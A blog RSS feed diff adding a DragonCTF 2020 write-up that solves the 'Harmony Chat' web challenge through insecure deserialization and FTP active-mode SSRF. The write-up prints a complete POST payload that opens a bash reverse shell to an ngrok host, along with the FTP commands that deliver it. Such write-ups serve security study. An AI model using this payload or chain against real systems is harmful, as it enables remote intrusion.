@@ -6,8 +6,160 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>CC Attribution-NonCommercial 4.0 International License</copyright>
-        <lastBuildDate>Sun, 25 Oct 2020 22:34:34 -0600</lastBuildDate>
+        <lastBuildDate>Sun, 22 Nov 2020 14:33:48 -0700</lastBuildDate>
         <atom:link href="https://jamvie.net/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>DragonCTF 2020: Harmony Chat</title>
+            <link>https://jamvie.net/posts/2020/11/dragonctf-2020-harmony-chat/</link>
+            <pubDate>Sun, 22 Nov 2020 14:33:48 -0700</pubDate>
+            
+            <guid>https://jamvie.net/posts/2020/11/dragonctf-2020-harmony-chat/</guid>
+            <description>A writeup for the first web problem, &amp;ldquo;Harmony Chat&amp;rdquo;, in DragonCTF 2020. A very fun and interesting challenge!
+TL;DR  Application is vulnerable to RCE via insecure deserialization on the /csp-report endpoint Use FTP active mode to SSRF a post request to /csp-report that would open a reverse shell on the application&amp;rsquo;s HTTP server Cat flag for profit  Let&amp;rsquo;s Begin! The Harmony Chat is a Discord-esque chat app where you can /register an account and create channels.</description>
+            <content type="html"><![CDATA[<p>A writeup for the first web problem, &ldquo;Harmony Chat&rdquo;, in DragonCTF 2020. A very fun and interesting challenge!</p>
+<h2 id="tldr">TL;DR</h2>
+<ul>
+<li>Application is vulnerable to RCE via insecure deserialization on the <code>/csp-report</code> endpoint</li>
+<li>Use FTP active mode to SSRF a post request to <code>/csp-report</code> that would open a reverse shell on the application&rsquo;s HTTP server</li>
+<li>Cat flag for profit</li>
+</ul>
+<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
+<p>The Harmony Chat is a Discord-esque chat app where you can <code>/register</code> an account and create channels. Once registered, you&rsquo;re given your UID, which you use to <code>/login</code> or to invite other users into a channel you create.</p>
+<p>There appears to be an FTP server to serve the role of delivering chat logs of a channel through an FTP data connection, which you can request for in the top-right corner of the chat app&rsquo;s GUI.</p>
+
+    <img src="/images/harmonylogs.png"  alt="research"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Clicking on it will take whatever you wrote in the channel&hellip;</p>
+
+    <img src="/images/harmonychatlogexample.png"  alt="research"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>and convert it into a txt file delivered to you through a data connection established by their FTP server to you:</p>
+<pre><code>vie: hello
+vie: hi
+vie: how are u today
+</code></pre><p><em>The format of the chatlog file that would be delivered to you via FTP</em></p>
+<p>The source was given for the challenge. We can see that the application supports the implementation of 3 servers: an HTTP one, an intermediary websockets one, and an FTP one. More on that in a bit.</p>
+<p>Exploring the source more, we see a module called <code>csp</code> which delivers a report should any chat log input violate the application&rsquo;s content-security policy, when you request for the chat log via HTTP instead of FTP:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">REPORT_URL</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/csp-report&#34;</span>
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ContentSecurityPolicy</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">path</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">REPORT_URL</span> <span style="color:#f92672">&amp;&amp;</span>
+      <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">method</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#f92672">&amp;&amp;</span>
+      <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>[<span style="color:#e6db74">&#34;content-type&#34;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;application/csp-report&#34;</span>) {
+    <span style="color:#a6e22e">handleReport</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>)
+    <span style="color:#66d9ef">return</span>
+  }
+
+  <span style="color:#a6e22e">injectCSPHeaders</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>)
+  <span style="color:#a6e22e">next</span>()
+}
+</code></pre></div><p>the function <code>handleReport()</code> is defined as so:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">handleReport</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#ae81ff">0</span>)
+
+  <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#a6e22e">chunk</span> =&gt; {
+    <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">chunk</span>])
+  })
+
+  <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;end&#34;</span>, () =&gt; {
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">204</span>).<span style="color:#a6e22e">end</span>()
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isLocal</span>(<span style="color:#a6e22e">req</span>)) {
+      <span style="color:#66d9ef">return</span>
+    }
+
+    <span style="color:#66d9ef">try</span> {
+      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">report</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">validateAndDecodeJSON</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">REPORT_SCHEMA</span>)
+      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">generateTextReport</span>(<span style="color:#a6e22e">report</span>[<span style="color:#e6db74">&#34;csp-report&#34;</span>]))
+    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">warn</span>(<span style="color:#a6e22e">error</span>)
+      <span style="color:#66d9ef">return</span>
+    }
+  })
+}
+
+
+...
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">isLocal</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>) =&gt; {
+  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">remoteAddress</span>
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ip</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">ip</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;::1&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">ip</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;::ffff:127.0.0.1&#34;</span>
+}
+
+</code></pre></div><p>In the <code>csp</code> module, the application does some basic LAN checking when the HTTP server recieves a POST request to the <code>REPORT_URL</code> endpoint (<code>/csp-report</code>).</p>
+<p>We can host the application locally. In our local instance, we can go ahead and play with the application ourselves and see what we get. Robert Xiao, team mentor, helped in realizing that RCE was achievable through <code>/csp-report</code>. With the application running locally on the right, we see that we can leverage the app&rsquo;s use of <code>javascript-serializer</code> to deserialize dangerous payloads. For example, <code>console.log(11111)</code>:</p>
+
+    <img src="/images/harmonyconsolelog.png"  alt="research"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>So, we can execute code through a POST request to <code>/csp-report</code>! Obviously, we can achieve a simple <code>console.log()</code> but this can be extended further into opening a reverse-shell. Anything is possible :)</p>
+<p>So, to recap, we have the capability to communicate to the basic HTTP server and an FTP server, alongside an RCE vulnerability if we make a malformed POST request to <code>/csp-report</code>. Of course, the RCE is easy to achieve when hosting the application locally, since we don&rsquo;t need to worry about failing the <code>isLocal</code> check. To replicate RCE on the actual application itself, we need to somehow trick a forward-facing server on there to make that POST request for us. AKA, we need to do some SSRF. Now, like mentioned before, we can communicate to 2 servers in the application: the HTTP one, and the FTP one. Let&rsquo;s explore FTP&rsquo;s capabilities further.</p>
+<p><a href="/posts/2020/04/plaidctf-2020-contrived-web-problem">I&rsquo;ve actually seen this attack before</a> - tricking an FTP server to send a rogue request to another server is quite easy to do if said FTP server supports active mode. To quickly summarize, FTP on active mode is essentially the client/user stipulating to the server where to establish its data connection to. By convention, you would typically tell it to connect to some port on your machine so you can transfer files between you and the server - but realistically, you can tell the server to establish a connection to wherever you want (so long as &ldquo;wherever you want&rdquo; has the stipulated port open).</p>
+<p>So the golden question - can we use FTP on active mode and make their server establish a data connection to their HTTP server, allowing us to use FTP to send them the POST request?
+(&hellip;I mean, yes, that&rsquo;s why we&rsquo;re here right? :P)</p>
+<p>So Harmony Chat&rsquo;s FTP server serves one (intended) purpose: to store then deliver a file showcasing the chat logs of a specific channel. Unfortunately, the FTP server doesn&rsquo;t have write access to these files it stores, so it&rsquo;s not like we can create some dummy file then edit it later. We will have to somehow craft a valid POST request in the chat log of a channel.</p>
+<p>How do we get this&hellip;</p>
+<pre><code>POST /csp-report?: HTTP/1.1
+Host: localhost:3380
+Content-Length: 386
+Content-Type: application/csp-report
+
+{&quot;csp-report&quot;: {&quot;blocked-uri&quot;: &quot;x&quot;, &quot;document-uri&quot;: &quot;X&quot;, &quot;effective-directive&quot;: &quot;X&quot;, &quot;original-policy&quot;: &quot;X&quot;, &quot;referrer&quot;: &quot;X&quot;, &quot;status-code&quot;: &quot;X&quot;, &quot;violated-directive&quot;: &quot;X&quot;, &quot;source-file&quot;: {&quot;toString&quot;: {&quot;___js-to-json-class___&quot;: &quot;Function&quot;, &quot;json&quot;: &quot;process.mainModule.require(\&quot;child_process\&quot;).exec(\&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/4.tcp.ngrok.io/18843 0&gt;&amp;1'\&quot;, {stdio:\&quot;inherit\&quot;})&quot;}}}}
+</code></pre><p>On here?</p>
+
+    <img src="/images/harmonychannel.png"  alt="research"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>First thing that came to mind was that the chat logs all have the same <code>displayName: message</code> format&hellip; So the thought was to split the POST request by the first occurence of <code>:</code> on each new line and have these different &ldquo;users&rdquo; deliver specific &ldquo;messages&rdquo; to construct the POST request there. You had the ability to invite multiple users to one channel, so this was probably the way to go.</p>
+<p>I know that this can be automated - but I did the process manually.
+So, we should have 5 &ldquo;users&rdquo;: <code>POST /csp-report?</code>, <code>Host</code>, <code>Content-Length</code>, <code>Content-Type</code> and <code>{&quot;csp-report&quot;</code>. They will then each message the chat in order as so&hellip;</p>
+<p>
+    <img src="/images/chatlogsPOST.png"  alt="research"  class="center"  style="border-radius: 8px;"  />
+
+
+<em>NOTE: not seen here, but I used the console to send an empty message that would register as a new line to seperate the request headers from the request body. You&rsquo;ll see what this looks like in a bit.</em></p>
+<p>I bet you can see where I&rsquo;m going with this. If we go ahead and download the associated chat log file, we get:</p>
+<pre><code>POST /csp-report?: HTTP/1.1
+Host: localhost:3380
+Content-Length: 386
+Content-Type: application/csp-report
+
+{&quot;csp-report&quot;: {&quot;blocked-uri&quot;: &quot;x&quot;, &quot;document-uri&quot;: &quot;X&quot;, &quot;effective-directive&quot;: &quot;X&quot;, &quot;original-policy&quot;: &quot;X&quot;, &quot;referrer&quot;: &quot;X&quot;, &quot;status-code&quot;: &quot;X&quot;, &quot;violated-directive&quot;: &quot;X&quot;, &quot;source-file&quot;: {&quot;toString&quot;: {&quot;___js-to-json-class___&quot;: &quot;Function&quot;, &quot;json&quot;: &quot;process.mainModule.require(\&quot;child_process\&quot;).exec(\&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/4.tcp.ngrok.io/18843 0&gt;&amp;1'\&quot;, {stdio:\&quot;inherit\&quot;})&quot;}}}}
+</code></pre><p>Which looks <em>exactly</em> like the POST request we would send to the HTTP server.</p>
+<p>We go ahead and ask the FTP server to STOR that chat log file in it (by clicking the logs button at the top right), and then connect to it ourselves. We need to give it these commands:</p>
+<pre><code>user &lt;uid&gt;
+pass                    &lt;-- Doesn't matter
+port 172,0,0,1,13,52    &lt;-- Sets FTP on active mode so this is required
+retr &lt;id of channel&gt;    &lt;-- Retrieves chat log, sends it in the data channel
+</code></pre>
+    <img src="/images/ftpcommunication.png"  alt="research"  class="center"  style="border-radius: 8px;"  />
+
+
+<ul>
+<li>
+<p>The <code>user</code> command is expecting a uid of any user in the current session. We technically made 5, so any of their uids work.</p>
+</li>
+<li>
+<p>The <code>pass</code> command can be blank, as the implementation of the application said any password will be accepted.</p>
+</li>
+<li>
+<p>The <code>port</code> command is what makes the FTP server operate in active mode. The command&rsquo;s arguments are the 4 bytes of the IP, then the 2 remaining values are the port number following this convention: p1, p2 where <code>(p1 * 256) + p2</code> = full port number. We want to connect to Harmony Chat&rsquo;s localhost at the HTTP server, which is at port 3380.</p>
+</li>
+<li>
+<p>The <code>retr</code> command takes the name of a file (in this case, the name of the chatlog) and retrieves it, then sends it over the data connection it just established. If we got things right, then the FTP server would have sent our POST request to the HTTP server.</p>
+</li>
+</ul>
+<p>Once the FTP server has confirmed that it RETRieved the channel&rsquo;s chatlog and sent it to the local HTTP server, we check back on our ngrok instance and see that a reverse-shell opened up. All that&rsquo;s left now is to <code>ls</code> our way to the flag :)</p>
+
+    <img src="/images/harmonyshell.png"  alt="research"  class="center"  style="border-radius: 8px;"  />
+
+
+<h4 id="vie">Vie</h4>
+]]></content>
+        </item>
         
         <item>
             <title>Hack.lu 2020: Confessions</title>
